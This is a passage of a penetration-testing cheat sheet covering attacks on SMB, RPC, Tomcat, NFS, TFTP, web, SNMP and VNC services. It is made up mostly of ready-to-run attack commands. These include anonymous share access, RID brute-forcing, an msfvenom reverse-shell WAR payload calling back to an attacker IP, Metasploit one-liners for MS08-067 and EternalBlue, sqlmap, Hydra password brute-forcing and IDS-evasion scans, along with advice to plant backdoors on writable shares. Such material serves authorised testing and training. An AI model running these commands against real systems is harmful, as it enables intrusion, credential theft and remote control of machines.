**Objective**: Access shares to inspect contents, check permissions, and download/upload files.

* **Tools**: smbclient, smbmap
* **Steps**: **Connect to Shares (Null Session)**:
* Attempt to connect to a share without credentials.

```shell
smbclient \\<IP>\\$Admin -N  
smbclient -N -L //<target>
```

* Connect to a specific share (e.g., "notes") for inspection.

```shell
smbclient //<target>/notes 
```

**Check Share Permissions**:

* Within smbclient, view permissions and list contents.

```shell
smb: \> showacls  
smb: \> dir  
```

**Download Files from Shares**:

* Download files or directories from a share.

```shell
smbclient \\<IP>\Replication  
smb: \> recurse ON  
smb: \> prompt OFF  
smb: \> mget *  
```

* Alternatively, use smbmap to download specific files.

```shell
smbmap -H <IP> --download Replication\active.htb\  
```

* If specific files are found (e.g., flag.txt), download and inspect them.

```shell
smbclient //<target>/notes  
smb: \> get flag.txt  
# Inspect downloaded file  
cat flag.txt    
```

**Upload Files to Shares**:

* Upload a test file to a share to verify write access.

```bash
 smbmap -H <IP> --upload test.txt <SHARENAME>/test.txt   
```

**Mount Shares Locally**:

* Mount a share to a local directory for easier access.

```bash
sudo mount -t cifs //<IP>/<SHARENAME> ~/path/to/mount_directory  
```

#### **Phase 4: User and Group Enumeration**

**Objective**: Enumerate domain users, groups, and their details to identify potential targets for further attacks.

* **Tools**: rpcclient, Impacket (samrdump.py)
* **Steps**: **Connect to RPC Service**:
* Access the target via rpcclient without credentials.

```shell
rpcclient -U "" <target>
```

**Enumerate General Information**:

* Gather server, domain, and share information.

```bash
srvinfo # Server information  
enumdomains # Enumerate domains  
querydominfo # Domain, server, and user info  
netshareenumall # Enumerate all shares  
netsharegetinfo <share> # Info about a specific share     
```

**Enumerate Users**:

* List all domain users and query specific user details.

```bash
enumdomusers # Enumerate all domain users  
queryuser <RID> # Info about a specific user
```

**Enumerate Groups**:

* Query group information for users.

```bash
 querygroup <group_rid> # Info about a specific group
```

**Brute-Force User RIDs**:

* Iterate through possible user RIDs to enumerate users.

{% code overflow="wrap" %}
```shell
for i in $(seq 500 1100); do rpcclient -N -U "" <target> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```
{% endcode %}

**Use Impacket for User Enumeration**:

* Use samrdump.py to enumerate users and SIDs.

```cs
samrdump.py <target>
```

* Additional Impacket tools for enumeration:

{% code overflow="wrap" %}
```bash
impacket-smbclient -no-pass <IP>  impacket-lookupsid domain/username:password@<IP> 
```
{% endcode %}

#### **Phase 5: Credential-Based Enumeration**

**Objective**: Use discovered or provided credentials to enumerate shares and permissions further.

* **Tools**: smbmap, CrackMapExec
* **Steps**: **List Shares with Credentials**:
* Use smbmap with valid credentials to access restricted shares.

```bash
smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN.TLD> -H <IP> 
```

**Enumerate Shares with CrackMapExec**:

* Use credentials to list shares and verify access.

```bash
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --shares 
```

#### **Phase 6: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., vulnerabilities, weak permissions, or credentials) for further exploitation.

* **Steps**:
  1. **Analyse Vulnerabilities**:
     * Review output from Nmap vulnerability scans (e.g., EternalBlue) and attempt exploitation using tools like Metasploit.
  2. **Exploit Weak Permissions**:
     * If writeable shares are found, upload malicious files or scripts (e.g., for privilege escalation).
  3. **Use Enumerated Users/Credentials**:
     * Attempt password spraying or brute-forcing with enumerated usernames using tools like CrackMapExec.
  4. **Document Findings**:
     * Record accessible shares, users, permissions, and vulnerabilities for the pentest report.

***

### 6. Tomcat Enumeration (Ports 8080, 8443)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify Tomcat services, versions, and basic configurations on the target.

* **Tools**: Nmap
* **Steps**: **Scan for Tomcat Services**:
* Use Nmap to detect open Tomcat ports (8080, 8443) and gather service/version information.

```shell
sudo nmap -sV -sC -p8080,8443 <target> 
```

**Enumerate Tomcat Manager and Users**:

* Run Nmap scripts to identify Tomcat manager interfaces and user information.

```shell
sudo nmap -p 8080,8443 --script=http-tomcat-manager,http-tomcat-users <target>
```

#### **Phase 2: Enumerating Tomcat Configurations**

**Objective**: Gather details about Tomcat’s web applications, manager access, and potential vulnerabilities.

* **Tools**: Nmap, Manual Inspection (e.g., browser, curl)
* **Steps**: **Check for Accessible Manager Interface**:
* Use a browser or curl to access common Tomcat paths (e.g., /manager/html, /host-manager/html).

```shell
curl -v http://<target>:8080/manager/html  curl -v https://<target>:8443/manager/html
```

* Note: If authentication is required, attempt default credentials (e.g., admin:admin, tomcat:tomcat) or brute-force with tools like Hydra. **Enumerate Web Applications**:
* Use Nmap or tools like dirb/gobuster to discover deployed web applications.

```shell
dirb http://<target>:8080
```

**Check for Vulnerabilities**:

* Review Nmap script output for vulnerabilities in the Tomcat version or misconfigurations (e.g., exposed manager interface).
* Optionally, use Metasploit modules (e.g., auxiliary/scanner/http/tomcat\_mgr\_login) to test for weak credentials.

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., weak credentials, misconfigurations) for further access.

* **Steps**: **Exploit Manager Access**:
* If credentials are obtained, log into /manager/html to deploy a malicious WAR file for code execution.

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f war > shell.war 
```
{% endcode %}

* Upload the WAR file via the manager interface. **Check for Known Vulnerabilities**:
* If the Tomcat version is outdated, search for CVEs (e.g., CVE-2020-1938 Ghostcat) and exploit using Metasploit or custom scripts. **Document Findings**:
* Record accessible interfaces, credentials, and vulnerabilities for the pentest report.

**Notes:**

* **Default Credentials**: Common Tomcat credentials include admin:admin, tomcat:tomcat, or manager:manager. Test these carefully.
* **HTTPS (8443)**: If port 8443 is open, ensure tools use HTTPS (https://) and handle SSL/TLS appropriately.
* **Scope**: Ensure permission to test the manager interface or deploy files to avoid legal issues.

***

### 7. NFS Enumeration (Ports 111, 2049)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify NFS services, versions, and available shares.

* **Tools**: Nmap, showmount
* **Steps**: **Scan for NFS Services**:
* Use Nmap to detect open NFS ports (111, 2049) and gather service/version information.

```shell
sudo nmap <target> -p111,2049 -sV -sC 
```

**Enumerate NFS-Specific Information**:

* Run Nmap scripts to gather details about NFS shares, permissions, and configurations.

{% code overflow="wrap" %}
```shell
sudo nmap <target> -sV -p111,2049 --script nfs*  sudo nmap -p 2049 --script=nfs-ls,nfs-statfs,nfs-showmount,nfs-acls <target>
```
{% endcode %}

**List Available NFS Shares**:

* Use showmount to display exported NFS shares.

```shell
showmount -e <IP> 
```

#### **Phase 2: Accessing and Enumerating NFS Shares**

**Objective**: Mount and inspect NFS shares to identify accessible files and permissions.

* **Tools**: mount, ls
* **Steps**: **Mount NFS Share**:
* Create a local directory and mount the NFS share.

```shell
mkdir target-NFS  sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock 
```

* Alternative mount options for specific NFS versions or shares:

{% code overflow="wrap" %}
```shell
sudo mount -t nfs -o vers=3 <IP>:/home/ ~/home  sudo mount -t nfs4 -o proto=tcp,port=2049 <IP>:/srv/Share <mountpoint> 
```
{% endcode %}

**List Share Contents**:

* Navigate to the mounted directory and list contents with usernames/groups or UIDs/GIDs.

{% code overflow="wrap" %}
```shell
cd target-NFS  tree .  ls -l mnt/nfs/ # List with usernames and group names  ls -n mnt/nfs/ # List with UIDs and GIDs 
```
{% endcode %}

**Unmount Share**:

* After inspection, unmount the share to clean up.

```shell
cd ..  
sudo umount ./target-NFS 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., misconfigured permissions, sensitive files) for further access.

* **Steps**:
  1. **Analyse Permissions**:
     * Check for world-readable/writeable shares or files with sensitive data (e.g., SSH keys, configuration files).
  2. **Exploit Write Access**:
     * If the share is writeable, upload malicious files (e.g., scripts, backdoors) or modify existing ones.
  3. **User Impersonation**:
     * If UIDs/GIDs match local users, manipulate files to escalate privileges (e.g., create a SUID binary).
  4. **Document Findings**:
     * Record accessible shares, files, and permissions for the pentest report.

**Notes:**

* **No Lock Option: The -nolock flag avoids file locking issues; adjust based on target behaviour.**
* **NFS Versions**: Specify NFS version (vers=3 or nfs4) if the default mount fails.
* **Security Risks**: Misconfigured NFS shares often expose sensitive data or allow unauthorised access. Test cautiously.

***

### 8. TFTP Enumeration (Port 69 UDP)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify TFTP services and enumerate available files or directories.

* **Tools**: Nmap, tftp, atftp
* **Steps**: **Scan for TFTP Services**:
* Use Nmap to detect open TFTP port (69 UDP) and gather service information.

```shell
sudo nmap -sU -p 69 --script=tftp-enum <target>
```

**Connect to TFTP Server**:

* Use tftp or atftp to interact with the TFTP service.

```bash
 tftp <IP>  
 atftp <IP>
```

#### **Phase 2: Enumerating Files and Directories**

**Objective**: Identify and retrieve files from the TFTP server.

* **Tools**: tftp, atftp
* **Steps**: **List or Retrieve Files**:
* Within the TFTP client, attempt to retrieve common files (e.g., config, backup, .txt files).

```bash
tftp <IP>  
tftp> get config  
tftp> get backup.conf 
```

* Note: TFTP does not support directory listing, so rely on Nmap’s tftp-enum script or guess common filenames. **Test Write Access**:
* Attempt to upload a test file to check for write permissions.

```bash
tftp <IP>  
tftp> put test.txt 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., sensitive files, write access) for further access.

* **Steps**: **Analyse Retrieved Files**:
* Inspect downloaded files for sensitive information (e.g., credentials, configuration details).

```shell
cat config
```

**Exploit Write Access**:

* If the TFTP server allows uploads, overwrite critical files (e.g., configuration files) or upload malicious scripts. **Check for Known Vulnerabilities**:
* If the TFTP service version is identified (via Nmap), research CVEs for potential exploits. **Document Findings**:
* Record accessible files, write permissions, and vulnerabilities for the pentest report.

## Phase 4: Vulnerability & Advanced Enumeration

### **1. OS Detection & Aggressive Scan**

#### **Phase 1: Footprinting and Comprehensive Scanning**

**Objective**: Identify the operating system, services, versions, and potential vulnerabilities on the target.

* **Tools**: Nmap
* **Steps**: **Perform Aggressive Scan**:
* Use Nmap’s -A flag to enable OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute with a faster timing template (-T4).

```shell
sudo nmap -A -T4 -oA aggressive_scan <target>
```

* **Note**: The -oA flag saves output in all formats (normal, XML, grepable) for later analysis.

#### **Phase 2: Analysing Results**

**Objective**: Review scan results to identify the operating system, open ports, services, and potential vulnerabilities.

* **Steps**: **Parse OS and Service Information**:
* Review the Nmap output to identify the operating system (e.g., Windows, Linux) and its version, as well as running services (e.g., HTTP, SMB).
* Example output analysis:
  * OS: Windows Server 2016
  * Ports: 80 (HTTP), 445 (SMB), 3389 (RDP)
  * Services: Apache 2.4, Microsoft SMBv1 **Identify Potential Vulnerabilities**:
* Check default script (-sC) results for misconfigurations or vulnerabilities (e.g., SMB null sessions, HTTP methods).
* Note any outdated service versions that may be vulnerable to known exploits.

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., OS version, service vulnerabilities) for further attacks.

* **Steps**: **Exploit OS Vulnerabilities**:
* If an outdated OS is detected (e.g., Windows XP, Server 2003), search for CVEs (e.g., MS08-067) and use Metasploit modules.

```bash
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOST <target>; run"  
```

**Target Service Vulnerabilities**:

* Use identified services (e.g., HTTP, SMB) to pivot to targeted vulnerability scans (see below). **Document Findings**:
* Record OS details, service versions, open ports, and vulnerabilities for the pentest report.

**Notes:**

* **Aggressive Scanning**: The -A flag is noisy and may trigger IDS/IPS; use with permission and caution.
* **Timing Template**: -T4 balances speed and reliability; adjust to -T3 for stealth or -T5 for faster scans if needed.
* **Scope**: Ensure explicit permission to perform aggressive scans, as they may disrupt services.

***

### 2. Targeted Vulnerability Scripting (Web & SMB)

#### **Phase 1: Footprinting and Service Enumeration (Web)**

**Objective**: Identify web server details, configurations, and potential vulnerabilities on ports 80 (HTTP) and 443 (HTTPS).

* **Tools**: Nmap, curl, WhatWeb, Nikto, dirb, gobuster, ffuf, wfuzz, sslscan, wpscan, wappalyzer
* **Steps**: **Basic Web Service Scan**:
* Use Nmap with default scripts to enumerate web services.

```shell
sudo nmap -Pn -sC -p80,443 <IP>
```

**Banner Grabbing and Basic Enumeration**:

* Gather web server banners, titles, methods, and robots.txt details.

{% code overflow="wrap" %}
```shell
sudo nmap -sV --script=banner,http-title,http-methods,http-robots.txt,http-server-header -p 80,443 -oA web_enum <target>
```
{% endcode %}

**Web Vulnerability Scanning**:

* Run Nmap scripts to detect common web vulnerabilities (e.g., SQL injection, XSS).

{% code overflow="wrap" %}
```shell
sudo nmap -p80,443 --script=http-vuln-* -oA web_vuln_scan <target>  
sudo nmap --script=http-sql-injection,http-xssed,http-enum,http-config-backup -p 80,443 <target> 
```
{% endcode %}

**Fast Fingerprinting with WhatWeb**:

* Identify web technologies and frameworks.

```http
 whatweb http://<target>  
 whatweb https://<target> --verbose
```

**Curl for Manual Inspection**:

* Retrieve HTTP headers and robots.txt to identify server details or hidden paths.

```http
curl -I <target>
curl http://<target>/robots.txt 
```

**Directory and File Enumeration**:

* Use dirb, gobuster, ffuf, and wfuzz to enumerate directories and files.

{% code overflow="wrap" %}
```bash
dirb <IP>  
dirb <IP> -X .php,.asp,.txt,.jsp  
dirb <IP> -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'  
!
sudo gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster_out.txt  sudo gobuster dir -u https://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k 
! 
sudo ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.html,.txt  
!
wfuzz -u http://<target>/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
{% endcode %}

**Nikto Vulnerability Scan**:

* Perform a comprehensive web vulnerability scan.

```bash
nikto -h http://<target> -C all -o nikto_report.html  
nikto -h <target> -useproxy http://127.0.0.1:8080 
```

**CMS and Technology Fingerprinting**:

* Use Wappalyzer and Wpscan to identify CMS and plugins (e.g., WordPress).

```bash
wappalyzer http://<IP>  
wpscan --url http://<IP> --enumerate u 
```

**SSL/TLS Enumeration**:

* Analyse SSL/TLS configurations for weaknesses.

```shell
sslscan <target>:443  
sudo nmap --script ssl-enum-ciphers -p 443 <target> 
```

#### **Phase 2: Footprinting and Service Enumeration (SMB)**

**Objective**: Identify SMB services and vulnerabilities on ports 139 and 445 (if applicable from aggressive scan).

* **Tools**: Nmap
* **Steps**: **SMB Enumeration**:
* If the aggressive scan (-A) identified SMB services, run targeted SMB vulnerability scripts.

```shell
  sudo nmap -p 139,445 --script=smb-vuln* <target>
```

**SMB Configuration and User Enumeration**:

* Enumerate shares, users, and configurations (as detailed in the SMB flow from previous responses).

{% code overflow="wrap" %}
```shell
sudo nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode <target>
```
{% endcode %}

#### **Phase 3: Analysing Results**

**Objective**: Review web and SMB scan results to identify vulnerabilities and misconfigurations.

* **Steps**: **Web Findings**:
* Analyse Nmap, Nikto, and directory enumeration outputs for:
  * Vulnerable software versions (e.g., outdated Apache, PHP).
  * Misconfigurations (e.g., exposed robots.txt, unsafe HTTP methods).
  * Potential injection points (e.g., SQL injection, XSS).
    * Review CMS-specific findings (e.g., WordPress plugins via wpscan) for known vulnerabilities. **SMB Findings**:
* Check for vulnerabilities like EternalBlue (MS17-010) or weak share permissions.
* Identify enumerated users or shares for further exploitation.

#### **Phase 4: Exploitation and Next Steps**

**Objective**: Leverage identified vulnerabilities or misconfigurations for further attacks.

* **Steps**: **Exploit Web Vulnerabilities**:
* If vulnerabilities like SQL injection or XSS are found, use tools like sqlmap or manual payloads.

```bash
sqlmap -u http://<target>/vulnerable_page.php?id=1 --dbs
```

* Exploit outdated CMS plugins using Metasploit or custom exploits. **Exploit SMB Vulnerabilities**:
* If SMB vulnerabilities (e.g., EternalBlue) are identified, use Metasploit.

{% code overflow="wrap" %}
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST <target>; run" 
```
{% endcode %}

**Brute-Force Credentials**:

* If web authentication pages are found, use Hydra or Burp Suite to brute-force credentials.

{% code overflow="wrap" %}
```bash
 hydra -L users.txt -P passwords.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"  
```
{% endcode %}

**Exploit SSL/TLS Weaknesses**:

* If weak ciphers or protocols are found, attempt man-in-the-middle attacks or downgrade attacks. **Document Findings**:
* Record vulnerabilities, misconfigurations, and enumerated data (e.g., directories, users) for the pentest report.

## Phase 5: Stealth & Evasion

Techniques for scanning when trying to avoid detection by firewalls or IDS. **11. Stealthy SYN Scan** **Use Case:** The default and most popular scan. It's stealthier than a full TCP connect (`-sT`) because it doesn't complete the TCP handshake.

{% code overflow="wrap" %}
```shell
sudo nmap -sS -p- -T2 -oA stealthy_syn_scan <target>  
```
{% endcode %}

**Advanced Firewall & IDS Evasion** **Use Case:** When stealth is the top priority. This combines multiple techniques (decoys, packet fragmentation) to make the scan extremely difficult to detect.

{% code overflow="wrap" %}
```shell
sudo nmap -sS -p- -D RND:10,ME -f --mtu 8 -oA evasion_scan <target>
```
{% endcode %}

**SNMP - Port 161 (UDP)**

{% code overflow="wrap" %}
```bash
# Enumerates device info, interfaces, and services
sudo nmap -sU -p 161,162 --script=snmp-info,snmp-interfaces,snmp-processes,snmp-win32-services,snmp-brute,snmp-sysdescr <target>

#Nmap UDP scan
sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt

snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

snmpwalk -v2c -c public STMIP | tee SNMPWalk.txt
snmpwalk -v2c -c public <IP>

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
 
onesixtyone -c community.txt <IP>
```
{% endcode %}

**VNC (Port 5900)**

{% code overflow="wrap" %}
```shell
# Gathers VNC info and attempts brute-forcing
sudo nmap -p 5900 --script=vnc-info,vnc-title,vnc-brute <target>  
```
{% endcode %}
